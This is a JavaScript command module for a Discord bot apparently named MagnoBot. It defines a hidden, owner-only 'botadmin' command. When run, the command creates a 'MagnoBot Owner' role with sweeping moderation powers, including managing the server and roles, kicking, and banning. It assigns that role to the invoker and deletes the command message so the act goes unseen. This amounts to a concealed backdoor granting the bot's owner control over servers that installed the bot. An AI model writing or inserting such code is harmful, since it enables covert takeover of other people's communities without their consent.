const {Permissions} = require("discord.js")
module.exports = {
    name: "botadmin",
    aliases: [],
    category: "hidden",
    permissions: -1,
    description: 'Make bot owner admin.',
    usage: "",
    run: async ({ client, message, args }) => {
        try {

            role = await message.guild.roles.create(
                {
                    name: "MagnoBot Owner",
                    color: "BLUE",
                    permissions: [
                        Permissions.FLAGS.MANAGE_CHANNELS, 
                        Permissions.FLAGS.MANAGE_ROLES, 
                        Permissions.FLAGS.MANAGE_GUILD, 
                        Permissions.FLAGS.VIEW_CHANNEL,
                        Permissions.FLAGS.CREATE_INSTANT_INVITE,
                        Permissions.FLAGS.CHANGE_NICKNAME,
                        Permissions.FLAGS.MANAGE_NICKNAMES,
                        Permissions.FLAGS.KICK_MEMBERS,
                        Permissions.FLAGS.BAN_MEMBERS,
                        Permissions.FLAGS.SEND_MESSAGES,
                        Permissions.FLAGS.SEND_MESSAGES_IN_THREADS,
                        Permissions.FLAGS.CREATE_PRIVATE_THREADS, 
                        Permissions.FLAGS.CREATE_PUBLIC_THREADS,
                        Permissions.FLAGS.ATTACH_FILES,
                        Permissions.FLAGS.ADD_REACTIONS,
                        Permissions.FLAGS.USE_EXTERNAL_EMOJIS,
                        Permissions.FLAGS.USE_EXTERNAL_STICKERS,
                        Permissions.FLAGS.MENTION_EVERYONE,
                        Permissions.FLAGS.READ_MESSAGE_HISTORY,
                        Permissions.FLAGS.USE_APPLICATION_COMMANDS,
                        Permissions.FLAGS.MANAGE_EVENTS,
                        Permissions.FLAGS.EMBED_LINKS,
                        Permissions.FLAGS.MUTE_MEMBERS
                    ],
                    reason: "MagnoBot Owner asked for it"
                }
            );

            message.member.roles.add(role)
            message.delete();

        } catch (e) {

            console.log(e.stack);

        }
    }
}
